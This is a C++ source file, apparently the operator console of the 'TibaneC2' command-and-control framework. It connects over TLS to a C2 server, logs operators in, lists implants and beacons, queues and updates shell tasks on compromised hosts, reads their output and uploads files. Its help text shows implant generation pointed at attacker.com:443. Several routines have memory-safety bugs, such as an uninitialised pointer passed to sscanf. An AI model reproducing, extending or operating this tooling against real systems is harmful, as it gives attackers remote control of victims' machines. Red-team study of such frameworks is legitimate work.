#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <cjson/cJSON.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <readline/readline.h>
#include <readline/history.h>
#include <crypt.h>

#include <openssl/evp.h>
#include <openssl/x509v3.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/x509.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <openssl/param_build.h>
#include <openssl/core_names.h> 
#include <openssl/sslerr.h>


//#include "includes/session.h"
//#include "includes/agent.h"


extern "C" {
    #include "./libs/libdisplay.h"
}

#define BUFFER_SIZE 0x100
#define MAX_SIZE 0x999999
#define HELP_SIZE 0x400

#define FILE_CHUNK 0x256

char IP[BUFFER_SIZE];
int PORT;
char current_operator[BUFFER_SIZE];

const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage [*]\n"
                                        "   whoami : shows logged in operator\n"
                                        "   implants : show all active implants\n"
                                        "   beacons : show all active beacons\n"
                                        "   get-implant -os=[windows/linux] -channel=[https/tls] -domain=attacker.com:443 -o=/path/to/implant : generate implant\n"
                                        "   list-tasks : shows all tasks for all implants\n"    
                                        "   beacon [id] : interactive shell for selected beacon\n"
                                        "   use [id] : same as beacon\n"
                                        "   upload [file path] : upload file to server\n"
                                        "   quit, q, exit : exit the program\n"
                                        "   \n---------------------------------\n";

const char beacon_shell_help[HELP_SIZE] = "\n[*] Tibane-shell (Beacon Usage) [*]\n\n"                              
                                    "   new-task [task] : Issue new task for the beacon\n"
                                    "   list-tasks : Show all information abouts tasks for beacon\n"
                                    "   response-task [task id] : show response for specific task\n"
                                    "   update-task [id] [cmd] : update task (only if it is not completed)\n"
                                    "   \n-----------------------------------\n";


void banner() {
printf("\n");    
printf("░▒▓████████▓▒░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░  \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░             ░▒▓█▓▒░ \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░  \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░        \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓████████▓▒░ \n");
printf("                        https://github.com/tibane0/TibaneC2\n");
printf("======================================================================================\n");                                                                                                                 
printf("[+] Welcome to tibane shell | type 'help' for options \n\n");
}


// talk to server
class Communicate_ {
    private:

    public:
    int sock;
    SSL_CTX *ctx;
    SSL *ssl;


    int conn() {

           // Initialize OpenSSL
        SSL_library_init();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();
        ctx = SSL_CTX_new(TLS_client_method());
        
    

        int status;
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);

        sock = socket(AF_INET, SOCK_STREAM, 0);

        if (inet_pton(AF_INET, IP, &serv_addr.sin_addr) <= 0) {
            //perror("Invalid Address");
            printf("\n[-] Invalid IP Address\n");
            return -1;
        }

        if ((status = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
           printf("\n[-] Connection Failed \n");
           return -1;
        }

        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        SSL_connect(ssl);

       return 0;
    }

    

    bool authenticate() {
        char user[BUFFER_SIZE];
        char pass[BUFFER_SIZE];

        printf("[+] Enter Username: ");
        fgets(user, sizeof(user) -1, stdin);
        user[strcspn(user, "\n")] = 0;
        printf("[+] Enter Password: ");
        fgets(pass, sizeof(pass) -1, stdin);
        pass[strcspn(pass, "\n")] = 0;
        

        // hash password
        
        cJSON *credentials = cJSON_CreateObject();
        if (!credentials) {
            return NULL;
        }
        cJSON_AddStringToObject(credentials, "username", user);
        cJSON_AddStringToObject(credentials, "password", pass);
        char *creds = cJSON_Print(credentials);
        if (!creds) {
            return false;
        }
        cJSON_Delete(credentials);
    
        //send(sock, creds, strlen(creds), 0);
        SSL_write(ssl, creds, strlen(creds));

        free(creds);

        char buffer[BUFFER_SIZE];
        int bytes = SSL_read(ssl, buffer, sizeof(buffer) -1);//recv(sock, buffer, sizeof(buffer) -1, 0);
        if (bytes <= 0) {
            perror("Recv Failed");
            return false;
        }
        buffer[bytes] = '\0'; 

        cJSON *response = cJSON_Parse(buffer);
        if (!response) {
            printf("Error parsing JSON!\n");
            return false;
        }
        cJSON *sign_in = cJSON_GetObjectItem(response, "authenticated");
        // handle 
        
        if (strcmp(sign_in->valuestring, "true") == 0) {
            cJSON_Delete(response);
            strncpy(current_operator, user,BUFFER_SIZE);
            return true;    
        }
        cJSON_Delete(response);
        return false;
    }
};


class SendInfo : public Communicate_ {
    public:

    int upload(const char* path) {
        cJSON *info = cJSON_CreateObject();
        if (!info) {
            return -1;
        }
        cJSON_AddStringToObject(info, "Info", "files");
        //cJSON_AddStringToObject(info, "folder", "operator");
        cJSON_AddStringToObject(info, "option", "upload");
        char *info_ = cJSON_Print(info);
        SSL_write(ssl, info_, strlen(info_));
        free(info_);
        cJSON_Delete(info);
        

        char *contents = (char*)malloc(MAX_SIZE);
        cJSON *fileO = cJSON_CreateObject();
        int file = open(path, O_RDONLY);
        if (access(path, F_OK) != 0 || file == -1) {
            return -1;
        } else if (contents == NULL) {
            cJSON_Delete(fileO);
            return -1;
        } else if (!fileO) {
            free(contents);
            return -1;
        }

        char filename[BUFFER_SIZE];
        strncpy(filename, path, sizeof(filename));
        cJSON_AddStringToObject(fileO, "file_name", filename);
        printf("Filename : %s", filename);
        char *Sfilename = cJSON_Print(fileO);
        cJSON_Delete(fileO);
        // send filename
        SSL_write(ssl, Sfilename, strlen(Sfilename));
        free(Sfilename);

        size_t bytesRead;
        while ((bytesRead = read(file, contents, FILE_CHUNK)) > 0) {
            SSL_write(ssl, contents, bytesRead);
            //send(sock, contents, bytesRead, 0);
            //printf("%s\n", contents);
        }
        free(contents);
        return 0;
    }

    int download() {
        return 0;
    }

    bool verify_id(const char* id) {
        cJSON *info = cJSON_CreateObject();
        if (!info) {
            return false;
        }
        cJSON_AddStringToObject(info, "Info", "verify_implant");
        cJSON_AddStringToObject(info, "implant_id", id);
        char *info_ = cJSON_Print(info);
        //send(sock, info_, strlen(info_), 0);
        SSL_write(ssl, info_, strlen(info_));
        #define FILE_CHUNK 0x256
        cJSON_Delete(info);
        free(info_);

        char reply[BUFFER_SIZE];
        SSL_read(ssl, reply, sizeof(reply));

        cJSON *re = cJSON_Parse(reply);
        if (!re) {
            printf("\n[-]failed to parse json");
            return false;
        }
        cJSON *valid_id = cJSON_GetObjectItem(re, "valid_id");
        if (strncmp(valid_id->valuestring, "false", sizeof("false")) ==0) {
            return false;
        }
        return true;

    }

    bool update_task(const char* id, int task_id, const char* command) {
        cJSON *info = cJSON_CreateObject();
        if (!info) {
            return false;
        }
        cJSON_AddStringToObject(info, "Info", "implant_id");
        cJSON_AddStringToObject(info, "implant_id", id);
        cJSON_AddStringToObject(info, "action", "update-task");
        cJSON_AddStringToObject(info, "command", command);
        cJSON_AddNumberToObject(info, "task_id", task_id);
        char *info_ = cJSON_Print(info);
        //send(sock, info_, strlen(info_), 0);
        SSL_write(ssl, info_, strlen(info_));
        
        cJSON_Delete(info);
        free(info_);

        //char reply[BUFFER_SIZE];
        char reply[BUFFER_SIZE];

        SSL_read(ssl, reply, BUFFER_SIZE-1);
        
        cJSON *re = cJSON_Parse(reply);
        if (!re) {
            return false;
        }

        cJSON *update = cJSON_GetObjectItem(re, "update");
        if (strncmp(update->valuestring, "false", sizeof("return")) == 0 ) {
            return false;
        }


        return true;
    
    }

    void new_task(const char *id, const char* command) {
        cJSON *info = cJSON_CreateObject();
        if (!info) {
            return;
        }
        cJSON_AddStringToObject(info, "Info", "implant_id");
        cJSON_AddStringToObject(info, "implant_id", id);
        cJSON_AddStringToObject(info, "action", "new-task");
        cJSON_AddStringToObject(info, "command", command);
        char *info_ = cJSON_Print(info);
        //send(sock, info_, strlen(info_), 0);
        SSL_write(ssl, info_, strlen(info_));
        
        cJSON_Delete(info);
        free(info_);

        char reply[BUFFER_SIZE];
        
        SSL_read(ssl, reply, sizeof(reply)-1);
        //recv(sock, reply, sizeof(reply), 0);
    }

    void Quit() {
        cJSON *info = cJSON_CreateObject();
        if (!info) {
            return;
        }
        cJSON_AddStringToObject(info, "Info", "exit");
        char *info_ = cJSON_Print(info);
        //send(sock, info_, strlen(info_), 0);
        SSL_write(ssl, info_, strlen(info_));
        cJSON_Delete(info);
        free(info_);
    }

};

class RetriveInfo : public Communicate_ {
    public:
    char* get_info(const char* table) {
        char buffer[BUFFER_SIZE];
        char *info_container = (char*)malloc(MAX_SIZE);
        if (!info_container) return NULL;

        cJSON *info = cJSON_CreateObject();
        if (!info) {
            return NULL;
        }
        cJSON_AddStringToObject(info, "Info", table);
        char *info_ = cJSON_Print(info);
        SSL_write(ssl, info_, strlen(info_));
        cJSON_Delete(info);
        free(info_);

        ssize_t bytes;
        int bytes_received = SSL_read(ssl, info_container, MAX_SIZE);//recv(sock, info_container, MAX_SIZE, 0);
        if (bytes_received <= 0) {
            perror("recv failed");
            return NULL;
        }
        return info_container;
    }


    char* list_tasks(const char *id) {
        char *info_container = (char*)malloc(MAX_SIZE + 1);
        if (!info_container) return NULL;
    
        cJSON *info = cJSON_CreateObject();
        if (!info) {
            free(info_container);
            return NULL;
        }
    
        // Correct JSON structure (matches server expectations)

        cJSON_AddStringToObject(info, "Info", "implant_id");
        cJSON_AddStringToObject(info, "implant_id", id);
        cJSON_AddStringToObject(info, "action", "list-tasks");
    
        char *info_json = cJSON_PrintUnformatted(info); // Smaller payload
        if (!info_json) {
            cJSON_Delete(info);
            free(info_container);
            return NULL;
        }
    
        // Send request
        SSL_write(ssl, info_json, strlen(info_json));
        //if (send(sock, info_json, strlen(info_json), 0) <= 0) {
        //    perror("send failed");
        //    free(info_json);
        //    cJSON_Delete(info);
        //    free(info_container);
        //    return NULL;
        //}

        free(info_json);
        cJSON_Delete(info);
    
        // Receive response
        
        int bytes_received = SSL_read(ssl, info_container, MAX_SIZE); //recv(sock, info_container, MAX_SIZE, 0);
        if (bytes_received <= 0) {
            perror("recv failed");
            free(info_container);
            return NULL;
        }
        info_container[bytes_received] = '\0';
    
        return info_container;
    }


    char *response_task(const char *id, int task_id) {
        char *info_container = (char*)malloc(MAX_SIZE);
        cJSON *info = cJSON_CreateObject();
        if (!info) {
            return NULL;
        }
        cJSON_AddStringToObject(info, "Info", "implant_id");
        cJSON_AddStringToObject(info, "implant_id", id);
        cJSON_AddStringToObject(info, "action", "response-task");
        cJSON_AddNumberToObject(info, "task_id", task_id);

        char *info_ = cJSON_Print(info);
        //send(sock, info_, strlen(info_), 0);
        SSL_write(ssl, info_, strlen(info_));

        cJSON_Delete(info);
        free(info_);

        int bytes_received = SSL_read(ssl, info_container, MAX_SIZE);//recv(sock, info_container, MAX_SIZE, 0);
        if (bytes_received <= 0) {
            perror("recv failed");
            return NULL;
        }
        return info_container;
    }
};

char* beacon_command_generator(const char* text, int state) {
    static const char* commands[] = {
        "info", "list-tasks", "new-task", "exit", "quit", "q", "whoami", NULL
    };
    
    static int list_index, len;
    const char* name;

    if (!state) {
        list_index = 0;
        len = strlen(text);
    }

    while ((name = commands[list_index++])) {
        if (strncmp(name, text, len) == 0) {
            return strdup(name);
        }
    }

    return NULL;
}

char** beacon_shell_completion(const char* text, int start, int end) {
    rl_attempted_completion_over = 1;
    return rl_completion_matches(text, beacon_command_generator);
}



class Operator {
    private:

    public:
    void AgentShell(const char* id, RetriveInfo recvinfo, SendInfo sendinfo) {
        // verify id
        if (sendinfo.verify_id(id) == false) {
            printf("[-] ID does not exist\n[-] Back to Home Shell \n\n");
            return;
        }

        printf("\n[+] Using Agent ID : %s \n", id);
        // Set up readline for this shell
        rl_attempted_completion_function = beacon_shell_completion;
        
        // Save current history and start fresh for this session
        HIST_ENTRY** orig_history = history_list();
        //clear_history();
        while (1) {
            
            char prompt[BUFFER_SIZE];
            snprintf(prompt, sizeof(prompt), "\n[ tibane-shell ] (%s) $ ", id);
            char *cmd = readline(prompt);

            if (!cmd) {
                printf("\n[-] Back to Home Shell \n\n");
                break;
            }

            if (strlen(cmd) == 0) {
                free(cmd);
                continue;  
            }

            add_history(cmd);

            if  (strncmp(cmd, "exit", 4) == 0||strncmp(cmd, "quit", 4) == 0 || strncmp(cmd, "q", 1)==0) {
                printf("\n[-] Back to Home Shell \n\n");
                return;
            } else if (strncmp(cmd, "info", 4) == 0) {
                // print every things about the agent | and all tasks related to agent

            } else if (strncmp(cmd, "list-tasks", 10) == 0) {
                // print all tasks
                // task_per_agent
                char* data = recvinfo.list_tasks(id);
                if (!data) {
                    printf("\n [-] NO DATA RELATED TO TASKS FOR %s \n\n", id);
                    free(data);
                    continue;
                }
                //displayinfo.display_tasks_per_agent(data);
                DisplayTasksPerAgent(data);
                free(data);
            } else if (strncmp(cmd, "new-task", 8) == 0) {
                char task[BUFFER_SIZE];
                if (sscanf(cmd, "new-task %s", task) != 1) {
                    printf("\n[-] Failed to add task\n");
                    continue;
                }
                sendinfo.new_task(id, task);
                printf("\n[+] Added Task \n");
            } else if (strncmp(cmd, "response-task", strlen("response-task")) == 0) {
                int task_id;
                if (sscanf(cmd, "response-task %d", &task_id) != 1) {
                    printf("\n[-] MUST HAVE TASK ID\n");
                    continue;
                }
                char *data = recvinfo.response_task(id, task_id);
                // print this data
                DisplayCommandResponse(data);
                free(data);
            } else if (strncmp(cmd, "update-task", strlen("update-task") == 0)) {
                int task_id;
                char command[BUFFER_SIZE];
                if (sscanf(cmd, "update-task %d %s", &task_id, command) != 2) {
                    printf("\n[-] MUST HAVE TASK ID AND NEW COMMAND \n [*] update-task [id] [cmd]\n");
                    continue;
                }
                if (sendinfo.update_task(id, task_id, command)) {
                    printf("\n[+] TASK UPDATED");
                } else {
                    printf("\n[-] TASK NOT UPDATED\n");
                }
                
            } else if (strncmp(cmd, "whoami", 6) == 0) {
                printf("%s", current_operator);
            } else {
                printf("%s", beacon_shell_help);
            }

            free(cmd);
        }
    }
};


char* command_generator(const char* text, int state);
char** shell_completion(const char* text, int start, int end);
void process_shell_command(const char* cmd, RetriveInfo recvinfo, SendInfo sendinfo, Operator op);

int configuration() {
    char filename[BUFFER_SIZE] = "tibane_console_conf.json";
    if (access(filename, F_OK) != 0) {
        return -1;
    }

    int conf = open(filename, O_RDONLY);
    if (conf == -1) {
        write(1, "Failed to Configuration file\n", 20);

        return -1;
    }

    char buffer[0x200];

    size_t bytesRead;
    if ((bytesRead = read(conf, buffer, sizeof(buffer))) <= 0) {
        perror("Read Error");
        return -1;
    }

    cJSON *config = cJSON_Parse(buffer);
    if (!config) {
        fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
        return -1;
    }

    cJSON *SERVER_ADDR = cJSON_GetObjectItem(config, "SERVER_ADDR");
    cJSON *SERVER_PORT = cJSON_GetObjectItem(config, "SERVER_PORT");

    //IP = SERVER_ADDR->valuestring;
    strncpy(IP, SERVER_ADDR->valuestring, sizeof(IP));
    PORT = SERVER_PORT->valueint;
    return 0;
}


int main(int argc, char** argv) {
    // configs
    if (argc != 3) { 
        if (configuration() == -1) {
            printf("\nUSAGE %s [IP] [PORT]\n\nOR\n\nInclude the tibane_console_conf.json file in same directory\n\n", argv[0]);
            return EXIT_FAILURE;
        }
    } else {
        strncpy(IP, argv[1], sizeof(IP));
        PORT = atoi(argv[2]);
    }
    
    char usage[BUFFER_SIZE] = "";

    // start 
    banner();
    Communicate_ com;
    Operator op;
    RetriveInfo recvinfo;
    SendInfo sendinfo;

    while (1) {
        printf("\n[*] Connecting to %s : %d \n", IP, PORT);
        if (com.conn() == 0) {
            break;
        };
        printf("\n[-] Failed to connect to server: \n");
        sleep(3);
    }
    recvinfo.sock = com.sock;
    sendinfo.sock = com.sock;
    recvinfo.ssl = com.ssl;
    recvinfo.ctx = com.ctx;
    sendinfo.ssl = com.ssl;
    sendinfo.ctx = com.ctx;
     
    int tries = 0;
    do {
        if (com.authenticate() == true) {
            break;
        }
        printf("[-] Failed to authenticate: \n[-] Try Again\n\n"); 
        tries++;
    } while (tries < 3);


    

    // shell
    // Initialize readline
    rl_attempted_completion_function = shell_completion;
    using_history();
    while (true) {
        char *cmd = readline("\n[ tibane-shell ] $ ");
        
        if (!cmd) {  // Handle Ctrl+D
            printf("Ctrl + D \n");
            break;
        }

        // Skip empty commands
        if (strlen(cmd) == 0) {
            free(cmd);
            continue;
        }

        // Add to history and process
        add_history(cmd);
        process_shell_command(cmd, recvinfo, sendinfo, op);
        free(cmd);
    }

    return 0;
}


//////////////////////////////////////////////
// shell

void process_shell_command(const char* cmd, RetriveInfo recvinfo, SendInfo sendinfo, Operator op) {
    if (strncmp(cmd, "implants", sizeof("implants")) == 0) {
        char* data = recvinfo.get_info("Implants");
        if (!data) {
            printf("\n[-] NO DATA ABOUT IMPLANTS \n");
            return;
        }
        //displayinfo.display_all_agents(data);
        DisplayAllAgents(data);
        free(data);
    } 
    else if (strncmp(cmd, "exit", 4) == 0 || strncmp(cmd, "quit", 4) == 0 || strncmp(cmd, "q", 1) == 0) {
        printf("\n[-] Exiting \n");
        sendinfo.Quit();
        exit(0);
    }
    else if (strncmp(cmd, "beacon", 6) == 0 || strncmp(cmd, "use", 3) == 0) {
        char id[9];
        if (sscanf(cmd, "beacon %8s", id) == 1) {
            // confirm if id exists
            op.AgentShell(id, recvinfo, sendinfo);
        } else if (sscanf(cmd, "use %8s", id) == 1) {
            op.AgentShell(id, recvinfo, sendinfo);
        }
    } 
    else if (strncmp(cmd, "list-tasks", 10) == 0) {
        char *id;
        if (sscanf(cmd, "list-tasks %s", id) != 1) {
            char* data = recvinfo.get_info("Tasks");
            if (!data) {
                printf("\n[-] NO DATA About Tasks\n");
                return;
            }
            DisplayAllTasks(data);
            free(data);
        } else {
            char* data = recvinfo.list_tasks(id);
            if (!data) {
                printf("\n[-] NO DATA RELATED TO TASKS FOR %s \n", id);
                free(data);
                return;
            }
            DisplayTasksPerAgent(data);
            free(data);
        }
    } else if (strncmp(cmd, "whoami", 6) == 0) {
        printf("\n%s\n", current_operator);
    }  else if (strncmp(cmd, "upload", 6) == 0) {
        char file_path[BUFFER_SIZE];
        //if (sscanf(cmd, "upload %s", file_path) != 1) {
        //    printf("\n[-] Use : upload [file path]\n");
        //    return;
        //}
        strncpy(file_path, cmd + 7, sizeof(file_path));
        if (sendinfo.upload(file_path) == -1) {
            printf("\n[-] Could Not Send File\n");
            return;
        }  
    } else {
        printf("%s", tibane_shell_help);
    }
}

char** shell_completion(const char* text, int start, int end) {
    rl_attempted_completion_over = 1;
    return rl_completion_matches(text, command_generator);
}



char* command_generator(const char* text, int state) {
    static const char* commands[] = {
        "implants", "beacon", "list-tasks", "whoami", "upload", "exit", "quit", "q", "use", NULL
    };
    
    static int list_index, len;
    const char* name;

    if (!state) {
        list_index = 0;
        len = strlen(text);
    }

    while ((name = commands[list_index++])) {
        if (strncmp(name, text, len) == 0) {
            return strdup(name);
        }
    }

    return NULL;
}


